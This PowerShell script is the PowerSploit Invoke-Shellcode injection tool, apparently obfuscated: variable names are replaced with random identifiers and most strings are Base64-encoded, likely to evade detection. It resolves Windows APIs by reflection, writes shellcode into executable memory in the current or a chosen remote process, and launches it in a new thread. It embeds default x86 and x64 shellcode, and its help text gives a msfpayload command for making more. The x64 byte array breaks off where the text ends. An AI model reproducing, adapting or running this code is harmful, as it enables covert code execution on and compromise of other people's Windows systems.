function Invoke-Shellcode
{
<#
.SYNOPSIS

Inject shellcode into the process ID of your choosing or within the context of the running PowerShell process.

PowerSploit Function: Invoke-Shellcode
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Portions of this project was based upon syringe.c v1.2 written by Spencer McIntyre

PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):

msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 

Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.
 
.PARAMETER ProcessID

Process ID of the process you want to inject shellcode into.

.PARAMETER Shellcode

Specifies an optional shellcode passed in as a byte array

.PARAMETER Force

Injects shellcode without prompting for confirmation. By default, Invoke-Shellcode prompts for confirmation before performing any malicious act.

.EXAMPLE

C:\PS> Invoke-Shellcode -ProcessId 4274

Description
-----------
Inject shellcode into process ID 4274.

.EXAMPLE

C:\PS> Invoke-Shellcode

Description
-----------
Inject shellcode into the running instance of PowerShell.

.EXAMPLE

C:\PS> Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)
    
Description
-----------
Overrides the shellcode included in the script with custom shellcode - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit!
#>
[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    ${a1c827e2c0ed4a4889805491350137e2},
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    ${da05bf47d70e468cb6812c76cc705015},
    [Switch]
    ${bab5df81ac5040dbbbb4c01205f3b8e4} = $False
)
    Set-StrictMode -Version 2.0
    if ( $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA')))] )
    {
        ps -Id ${a1c827e2c0ed4a4889805491350137e2} -ErrorAction Stop | Out-Null
    }
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            [Parameter( Position = 0)]
            [Type[]]
            ${bb080aeaa9c14dd289ca1d3b20e4fda6} = (New-Object Type[](0)),
            [Parameter( Position = 1 )]
            [Type]
            ${da743f05712e4f02a41b906b7a9388d4} = [Void]
        )
        ${71eb5891e394463096dc7fc8acf3fc73} = [AppDomain]::CurrentDomain
        ${39c43027fab24b0a875e3cc4784e463c} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
        ${37613de083794f43bc0264300304466e} = ${71eb5891e394463096dc7fc8acf3fc73}.DefineDynamicAssembly(${39c43027fab24b0a875e3cc4784e463c}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        ${9a1e2f639f084282bca9ee6a3998e64d} = ${37613de083794f43bc0264300304466e}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
        ${84781afc1aa84b9f8e5fdf7b5b0069c1} = ${9a1e2f639f084282bca9ee6a3998e64d}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
        ${7679f70a96684b37801aad08b7b7d4ee} = ${84781afc1aa84b9f8e5fdf7b5b0069c1}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${bb080aeaa9c14dd289ca1d3b20e4fda6})
        ${7679f70a96684b37801aad08b7b7d4ee}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
        ${00f967a230144148a5ecd0548fad806b} = ${84781afc1aa84b9f8e5fdf7b5b0069c1}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${da743f05712e4f02a41b906b7a9388d4}, ${bb080aeaa9c14dd289ca1d3b20e4fda6})
        ${00f967a230144148a5ecd0548fad806b}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
        echo ${84781afc1aa84b9f8e5fdf7b5b0069c1}.CreateType()
    }
    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            ${bd379c865c084d63926b29e274d13c57},
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            ${bc83db2988b24a899decd06f5ce0dc17}
        )
        ${a86fee8214b64e148362d3df44da8af8} = [AppDomain]::CurrentDomain.GetAssemblies() |
            ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
        ${4813ce3f11724d888b9117e371746ba0} = ${a86fee8214b64e148362d3df44da8af8}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
        ${7c4b9679d1684198b7ce9140b9f0bd99} = ${4813ce3f11724d888b9117e371746ba0}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
        ${e3ff860698774c5e9d02353020ef9981} = ${4813ce3f11724d888b9117e371746ba0}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))))
        ${d99b5df878d84ee3bc4365ce54168944} = ${7c4b9679d1684198b7ce9140b9f0bd99}.Invoke($null, @(${bd379c865c084d63926b29e274d13c57}))
        ${d97b10151d0445c58cd2ea9b89a144be} = New-Object IntPtr
        ${bd92edae7eb847bc959746f3df013e1a} = New-Object System.Runtime.InteropServices.HandleRef(${d97b10151d0445c58cd2ea9b89a144be}, ${d99b5df878d84ee3bc4365ce54168944})
        echo ${e3ff860698774c5e9d02353020ef9981}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${bd92edae7eb847bc959746f3df013e1a}, ${bc83db2988b24a899decd06f5ce0dc17}))
    }
    function Local:Emit-CallThreadStub ([IntPtr] ${e3d140623c6145739659a574f66ba0df}, [IntPtr] ${ba243e174cbe490f95dbdf6afb87d6a5}, [Int] ${af758dacc80d4df9aee6c34c5e3ff606})
    {
        ${a1ead47639d84c6abd3d3b5d395e5113} = ${af758dacc80d4df9aee6c34c5e3ff606} / 8
        function Local:ConvertTo-LittleEndian ([IntPtr] ${abe88355e36649e294f6146033fa00d2})
        {
            ${cad64f9475e44f37aedc857432a529ea} = New-Object Byte[](0)
            ${abe88355e36649e294f6146033fa00d2}.ToString("X$(${a1ead47639d84c6abd3d3b5d395e5113}*2)") -split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABbAEEALQBGADAALQA5AF0AewAyAH0AKQA='))) | % { if ($_) { ${cad64f9475e44f37aedc857432a529ea} += [Byte] ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAB9AA=='))) -f $_) } }
            [System.Array]::Reverse(${cad64f9475e44f37aedc857432a529ea})
            echo ${cad64f9475e44f37aedc857432a529ea}
        }
        ${d83cbd9f2c8c4fd4b1096659282c3d02} = New-Object Byte[](0)
        if (${a1ead47639d84c6abd3d3b5d395e5113} -eq 8)
        {
            [Byte[]] ${d83cbd9f2c8c4fd4b1096659282c3d02} = 0x48,0xB8                      
            ${d83cbd9f2c8c4fd4b1096659282c3d02} += ConvertTo-LittleEndian ${e3d140623c6145739659a574f66ba0df}       
            ${d83cbd9f2c8c4fd4b1096659282c3d02} += 0xFF,0xD0                              
            ${d83cbd9f2c8c4fd4b1096659282c3d02} += 0x6A,0x00                              
            ${d83cbd9f2c8c4fd4b1096659282c3d02} += 0x48,0xB8                              
            ${d83cbd9f2c8c4fd4b1096659282c3d02} += ConvertTo-LittleEndian ${ba243e174cbe490f95dbdf6afb87d6a5} 
            ${d83cbd9f2c8c4fd4b1096659282c3d02} += 0xFF,0xD0                              
        }
        else
        {
            [Byte[]] ${d83cbd9f2c8c4fd4b1096659282c3d02} = 0xB8                           
            ${d83cbd9f2c8c4fd4b1096659282c3d02} += ConvertTo-LittleEndian ${e3d140623c6145739659a574f66ba0df}       
            ${d83cbd9f2c8c4fd4b1096659282c3d02} += 0xFF,0xD0                              
            ${d83cbd9f2c8c4fd4b1096659282c3d02} += 0x6A,0x00                              
            ${d83cbd9f2c8c4fd4b1096659282c3d02} += 0xB8                                   
            ${d83cbd9f2c8c4fd4b1096659282c3d02} += ConvertTo-LittleEndian ${ba243e174cbe490f95dbdf6afb87d6a5} 
            ${d83cbd9f2c8c4fd4b1096659282c3d02} += 0xFF,0xD0                              
        }
        echo ${d83cbd9f2c8c4fd4b1096659282c3d02}
    }
    function Local:Inject-RemoteShellcode ([Int] ${a1c827e2c0ed4a4889805491350137e2})
    {
        ${bbc927d3e9464169bdc8c8a1c5319604} = ${3ebe29a2fe6b4585ae05f269775ede9e}.Invoke(0x001F0FFF, $false, ${a1c827e2c0ed4a4889805491350137e2}) 
        if (!${bbc927d3e9464169bdc8c8a1c5319604})
        {
            Throw "Unable to open a process handle for PID: ${a1c827e2c0ed4a4889805491350137e2}"
        }
        ${e96f52ccbbef4b70a8b15f725b641527} = $false
        if (${9c25a4ee2a114bf3b84fe7037b5b0ae3}) 
        {
            ${8b1effb44a8745ef8806e93313dfd2c9}.Invoke(${bbc927d3e9464169bdc8c8a1c5319604}, [Ref] ${e96f52ccbbef4b70a8b15f725b641527}) | Out-Null
            if ((!${e96f52ccbbef4b70a8b15f725b641527}) -and ${a14e3c15a6454971b8418282b187db76})
            {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGUAbABsAGMAbwBkAGUAIABpAG4AagBlAGMAdABpAG8AbgAgAHQAYQByAGcAZQB0AGkAbgBnACAAYQAgADYANAAtAGIAaQB0ACAAcAByAG8AYwBlAHMAcwAgAGYAcgBvAG0AIAAzADIALQBiAGkAdAAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABpAHMAIABuAG8AdAAgAHMAdQBwAHAAbwByAHQAZQBkAC4AIABVAHMAZQAgAHQAaABlACAANgA0AC0AYgBpAHQAIAB2AGUAcgBzAGkAbwBuACAAbwBmACAAUABvAHcAZQByAHMAaABlAGwAbAAgAGkAZgAgAHkAbwB1ACAAdwBhAG4AdAAgAHQAaABpAHMAIAB0AG8AIAB3AG8AcgBrAC4A')))
            }
            elseif (${e96f52ccbbef4b70a8b15f725b641527}) 
            {
                if ($Shellcode32.Length -eq 0)
                {
                    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwBoAGUAbABsAGMAbwBkAGUAIAB3AGEAcwAgAHAAbABhAGMAZQBkACAAaQBuACAAdABoAGUAIAAkAFMAaABlAGwAbABjAG8AZABlADMAMgAgAHYAYQByAGkAYQBiAGwAZQAhAA==')))
                }
                ${da05bf47d70e468cb6812c76cc705015} = $Shellcode32
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGoAZQBjAHQAaQBuAGcAIABpAG4AdABvACAAYQAgAFcAbwB3ADYANAAgAHAAcgBvAGMAZQBzAHMALgA=')))
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAMwAyAC0AYgBpAHQAIABzAGgAZQBsAGwAYwBvAGQAZQAuAA==')))
            }
            else 
            {
                if ($Shellcode64.Length -eq 0)
                {
                    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwBoAGUAbABsAGMAbwBkAGUAIAB3AGEAcwAgAHAAbABhAGMAZQBkACAAaQBuACAAdABoAGUAIAAkAFMAaABlAGwAbABjAG8AZABlADYANAAgAHYAYQByAGkAYQBiAGwAZQAhAA==')))
                }
                ${da05bf47d70e468cb6812c76cc705015} = $Shellcode64
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAANgA0AC0AYgBpAHQAIABzAGgAZQBsAGwAYwBvAGQAZQAuAA==')))
            }
        }
        else 
        {
            if ($Shellcode32.Length -eq 0)
            {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwBoAGUAbABsAGMAbwBkAGUAIAB3AGEAcwAgAHAAbABhAGMAZQBkACAAaQBuACAAdABoAGUAIAAkAFMAaABlAGwAbABjAG8AZABlADMAMgAgAHYAYQByAGkAYQBiAGwAZQAhAA==')))
            }
            ${da05bf47d70e468cb6812c76cc705015} = $Shellcode32
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAMwAyAC0AYgBpAHQAIABzAGgAZQBsAGwAYwBvAGQAZQAuAA==')))
        }
        ${6bc2b18e42af49ad85011f1b677ce6cb} = ${8db0f45eca4f44feaf866f2cd42efd1b}.Invoke(${bbc927d3e9464169bdc8c8a1c5319604}, [IntPtr]::Zero, ${da05bf47d70e468cb6812c76cc705015}.Length + 1, 0x3000, 0x40) 
        if (!${6bc2b18e42af49ad85011f1b677ce6cb})
        {
            Throw "Unable to allocate shellcode memory in PID: ${a1c827e2c0ed4a4889805491350137e2}"
        }
        Write-Verbose "Shellcode memory reserved at 0x$(${6bc2b18e42af49ad85011f1b677ce6cb}.ToString("X$([IntPtr]::Size*2)"))"
        ${99cd331d99df48e8ae580253e8b17169}.Invoke(${bbc927d3e9464169bdc8c8a1c5319604}, ${6bc2b18e42af49ad85011f1b677ce6cb}, ${da05bf47d70e468cb6812c76cc705015}, ${da05bf47d70e468cb6812c76cc705015}.Length, [Ref] 0) | Out-Null
        ${ba243e174cbe490f95dbdf6afb87d6a5} = Get-ProcAddress kernel32.dll ExitThread
        if (${e96f52ccbbef4b70a8b15f725b641527})
        {
            ${d83cbd9f2c8c4fd4b1096659282c3d02} = Emit-CallThreadStub ${6bc2b18e42af49ad85011f1b677ce6cb} ${ba243e174cbe490f95dbdf6afb87d6a5} 32
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBtAGkAdAB0AGkAbgBnACAAMwAyAC0AYgBpAHQAIABhAHMAcwBlAG0AYgBsAHkAIABjAGEAbABsACAAcwB0AHUAYgAuAA==')))
        }
        else
        {
            ${d83cbd9f2c8c4fd4b1096659282c3d02} = Emit-CallThreadStub ${6bc2b18e42af49ad85011f1b677ce6cb} ${ba243e174cbe490f95dbdf6afb87d6a5} 64
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBtAGkAdAB0AGkAbgBnACAANgA0AC0AYgBpAHQAIABhAHMAcwBlAG0AYgBsAHkAIABjAGEAbABsACAAcwB0AHUAYgAuAA==')))
        }
        ${037523e80b9f4528980cfbd1bc5de1a2} = ${8db0f45eca4f44feaf866f2cd42efd1b}.Invoke(${bbc927d3e9464169bdc8c8a1c5319604}, [IntPtr]::Zero, ${d83cbd9f2c8c4fd4b1096659282c3d02}.Length, 0x3000, 0x40) 
        if (!${037523e80b9f4528980cfbd1bc5de1a2})
        {
            Throw "Unable to allocate thread call stub memory in PID: ${a1c827e2c0ed4a4889805491350137e2}"
        }
        Write-Verbose "Thread call stub memory reserved at 0x$(${037523e80b9f4528980cfbd1bc5de1a2}.ToString("X$([IntPtr]::Size*2)"))"
        ${99cd331d99df48e8ae580253e8b17169}.Invoke(${bbc927d3e9464169bdc8c8a1c5319604}, ${037523e80b9f4528980cfbd1bc5de1a2}, ${d83cbd9f2c8c4fd4b1096659282c3d02}, ${d83cbd9f2c8c4fd4b1096659282c3d02}.Length, [Ref] 0) | Out-Null
        ${9fe8c30bc755439cbb6abb5c2095c0f2} = ${9edf6540c07a449d85e95fc37d04768c}.Invoke(${bbc927d3e9464169bdc8c8a1c5319604}, [IntPtr]::Zero, 0, ${037523e80b9f4528980cfbd1bc5de1a2}, ${6bc2b18e42af49ad85011f1b677ce6cb}, 0, [IntPtr]::Zero)
        if (!${9fe8c30bc755439cbb6abb5c2095c0f2})
        {
            Throw "Unable to launch remote thread in PID: ${a1c827e2c0ed4a4889805491350137e2}"
        }
        ${4d80fc465d0f4c81a9f0510ed4e4a630}.Invoke(${bbc927d3e9464169bdc8c8a1c5319604}) | Out-Null
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGUAbABsAGMAbwBkAGUAIABpAG4AagBlAGMAdABpAG8AbgAgAGMAbwBtAHAAbABlAHQAZQAhAA==')))
    }
    function Local:Inject-LocalShellcode
    {
        if (${a14e3c15a6454971b8418282b187db76}) {
            if ($Shellcode32.Length -eq 0)
            {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwBoAGUAbABsAGMAbwBkAGUAIAB3AGEAcwAgAHAAbABhAGMAZQBkACAAaQBuACAAdABoAGUAIAAkAFMAaABlAGwAbABjAG8AZABlADMAMgAgAHYAYQByAGkAYQBiAGwAZQAhAA==')))
                return
            }
            ${da05bf47d70e468cb6812c76cc705015} = $Shellcode32
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAMwAyAC0AYgBpAHQAIABzAGgAZQBsAGwAYwBvAGQAZQAuAA==')))
        }
        else
        {
            if ($Shellcode64.Length -eq 0)
            {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcwBoAGUAbABsAGMAbwBkAGUAIAB3AGEAcwAgAHAAbABhAGMAZQBkACAAaQBuACAAdABoAGUAIAAkAFMAaABlAGwAbABjAG8AZABlADYANAAgAHYAYQByAGkAYQBiAGwAZQAhAA==')))
                return
            }
            ${da05bf47d70e468cb6812c76cc705015} = $Shellcode64
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAANgA0AC0AYgBpAHQAIABzAGgAZQBsAGwAYwBvAGQAZQAuAA==')))
        }
        ${b988be9001884bb6a7ea7d43e22fbecc} = ${eb933ced95a944428b16abca963b8087}.Invoke([IntPtr]::Zero, ${da05bf47d70e468cb6812c76cc705015}.Length + 1, 0x3000, 0x40) 
        if (!${b988be9001884bb6a7ea7d43e22fbecc})
        {
            Throw "Unable to allocate shellcode memory in PID: ${a1c827e2c0ed4a4889805491350137e2}"
        }
        Write-Verbose "Shellcode memory reserved at 0x$(${b988be9001884bb6a7ea7d43e22fbecc}.ToString("X$([IntPtr]::Size*2)"))"
        [System.Runtime.InteropServices.Marshal]::Copy(${da05bf47d70e468cb6812c76cc705015}, 0, ${b988be9001884bb6a7ea7d43e22fbecc}, ${da05bf47d70e468cb6812c76cc705015}.Length)
        ${ba243e174cbe490f95dbdf6afb87d6a5} = Get-ProcAddress kernel32.dll ExitThread
        if (${a14e3c15a6454971b8418282b187db76})
        {
            ${d83cbd9f2c8c4fd4b1096659282c3d02} = Emit-CallThreadStub ${b988be9001884bb6a7ea7d43e22fbecc} ${ba243e174cbe490f95dbdf6afb87d6a5} 32
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBtAGkAdAB0AGkAbgBnACAAMwAyAC0AYgBpAHQAIABhAHMAcwBlAG0AYgBsAHkAIABjAGEAbABsACAAcwB0AHUAYgAuAA==')))
        }
        else
        {
            ${d83cbd9f2c8c4fd4b1096659282c3d02} = Emit-CallThreadStub ${b988be9001884bb6a7ea7d43e22fbecc} ${ba243e174cbe490f95dbdf6afb87d6a5} 64
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBtAGkAdAB0AGkAbgBnACAANgA0AC0AYgBpAHQAIABhAHMAcwBlAG0AYgBsAHkAIABjAGEAbABsACAAcwB0AHUAYgAuAA==')))
        }
        ${d9667c5c1e8f43f8afda84bd01ba4a29} = ${eb933ced95a944428b16abca963b8087}.Invoke([IntPtr]::Zero, ${d83cbd9f2c8c4fd4b1096659282c3d02}.Length + 1, 0x3000, 0x40) 
        if (!${d9667c5c1e8f43f8afda84bd01ba4a29})
        {
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIAB0AGgAcgBlAGEAZAAgAGMAYQBsAGwAIABzAHQAdQBiAC4A')))
        }
        Write-Verbose "Thread call stub memory reserved at 0x$(${d9667c5c1e8f43f8afda84bd01ba4a29}.ToString("X$([IntPtr]::Size*2)"))"
        [System.Runtime.InteropServices.Marshal]::Copy(${d83cbd9f2c8c4fd4b1096659282c3d02}, 0, ${d9667c5c1e8f43f8afda84bd01ba4a29}, ${d83cbd9f2c8c4fd4b1096659282c3d02}.Length)
        ${9fe8c30bc755439cbb6abb5c2095c0f2} = ${56bc5f168ce04046907a2bb4ffc2497f}.Invoke([IntPtr]::Zero, 0, ${d9667c5c1e8f43f8afda84bd01ba4a29}, ${b988be9001884bb6a7ea7d43e22fbecc}, 0, [IntPtr]::Zero)
        if (!${9fe8c30bc755439cbb6abb5c2095c0f2})
        {
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABsAGEAdQBuAGMAaAAgAHQAaAByAGUAYQBkAC4A')))
        }
        ${590b2e0764d34d65ba757e59bd6b00b4}.Invoke(${9fe8c30bc755439cbb6abb5c2095c0f2}, 0xFFFFFFFF) | Out-Null
        ${711707a94e3e4d0cb26eba626fed37bc}.Invoke(${d9667c5c1e8f43f8afda84bd01ba4a29}, ${d83cbd9f2c8c4fd4b1096659282c3d02}.Length + 1, 0x8000) | Out-Null 
        ${711707a94e3e4d0cb26eba626fed37bc}.Invoke(${b988be9001884bb6a7ea7d43e22fbecc}, ${da05bf47d70e468cb6812c76cc705015}.Length + 1, 0x8000) | Out-Null 
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGUAbABsAGMAbwBkAGUAIABpAG4AagBlAGMAdABpAG8AbgAgAGMAbwBtAHAAbABlAHQAZQAhAA==')))
    }
    ${ad094e774331414aa822a80ef498872c} = Get-ProcAddress kernel32.dll IsWow64Process
    ${4c47f327f7344dbba8ad92d5e80a8255} = $null
    try {
        ${4c47f327f7344dbba8ad92d5e80a8255} = @(gwmi -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIABBAGQAZAByAGUAcwBzAFcAaQBkAHQAaAAgAEYAUgBPAE0AIABXAGkAbgAzADIAXwBQAHIAbwBjAGUAcwBzAG8AcgA='))))[0] | select -ExpandProperty AddressWidth
    } catch {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABkAGUAdABlAHIAbQBpAG4AZQAgAE8AUwAgAHAAcgBvAGMAZQBzAHMAbwByACAAYQBkAGQAcgBlAHMAcwAgAHcAaQBkAHQAaAAuAA==')))
    }
    switch (${4c47f327f7344dbba8ad92d5e80a8255}) {
        '32' {
            ${9c25a4ee2a114bf3b84fe7037b5b0ae3} = $False
        }
        '64' {
            ${9c25a4ee2a114bf3b84fe7037b5b0ae3} = $True
            ${f799f54c46b24705bc8fbe41d173eb3d} = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	    ${8b1effb44a8745ef8806e93313dfd2c9} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${ad094e774331414aa822a80ef498872c}, ${f799f54c46b24705bc8fbe41d173eb3d})
        }
        default {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAE8AUwAgAGEAZABkAHIAZQBzAHMAIAB3AGkAZAB0AGgAIABkAGUAdABlAGMAdABlAGQALgA=')))
        }
    }
    if ([IntPtr]::Size -eq 4)
    {
        ${a14e3c15a6454971b8418282b187db76} = $true
    }
    else
    {
        ${a14e3c15a6454971b8418282b187db76} = $false
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGUAbABsAGMAbwBkAGUA')))])
    {
        [Byte[]] $Shellcode32 = ${da05bf47d70e468cb6812c76cc705015}
        [Byte[]] $Shellcode64 = $Shellcode32
    }
    else
    {
        [Byte[]] $Shellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                  0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
                                  0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
                                  0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,
                                  0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,
                                  0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                                  0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
                                  0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,
                                  0x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,
                                  0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
                                  0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                  0x61,0x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                  0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                  0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
                                  0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
                                  0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
                                  0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
                                  0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                                  0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
                                  0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
                                  0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
                                  0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                                  0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
                                  0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
